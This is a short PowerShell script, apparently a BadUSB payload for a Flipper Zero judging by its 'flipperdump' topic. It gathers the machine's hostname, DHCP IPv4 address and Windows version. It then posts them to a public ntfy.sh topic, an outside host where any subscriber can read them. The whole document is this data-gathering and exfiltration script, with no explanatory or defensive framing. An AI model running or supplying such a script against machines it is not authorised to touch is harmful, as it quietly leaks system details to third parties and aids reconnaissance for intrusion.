$topic = 'flipperdump'

# Get the machine's hostname
$hostname = $env:COMPUTERNAME

# Get the primary IP address
$ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' }).IPAddress

# Get the OS version and build information
$osVersion = (Get-CimInstance Win32_OperatingSystem).Caption + ' ' + (Get-CimInstance Win32_OperatingSystem).Version

# Create the message to send
$message = "Host: $hostname`nIP: $ipAddress`nOS: $osVersion"

# Send the message to ntfy
$url = 'https://ntfy.sh/' + $topic
try {
    Invoke-RestMethod -Method Post -Uri $url -Body $message
} catch {
    Write-Host 'Failed to send notification: ' + $_
}
